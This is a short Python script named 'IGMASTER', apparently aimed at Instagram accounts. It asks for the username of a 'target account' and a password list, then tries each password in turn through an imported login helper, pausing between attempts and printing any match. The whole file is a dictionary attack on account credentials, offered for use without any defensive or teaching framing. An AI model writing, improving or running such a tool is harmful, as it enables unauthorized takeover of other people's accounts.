import time
import inpass
print("IGMASTER")
username=input("Enter Username of target account: ")
password_file=input("Enter directory of passlist(recommended to create/add file in same venv folder as the main.py file):")

with open(password_file, 'r') as file:#opens the passlist file in read mode
    passwords = file.read().splitlines()

for password in passwords:
    if inpass.login(username, password):
        print(f"Password match: {password}")
        break
    else:
        print(f"Password {password} not matching")
    time.sleep(1)
else:
    print("All passwords failed.")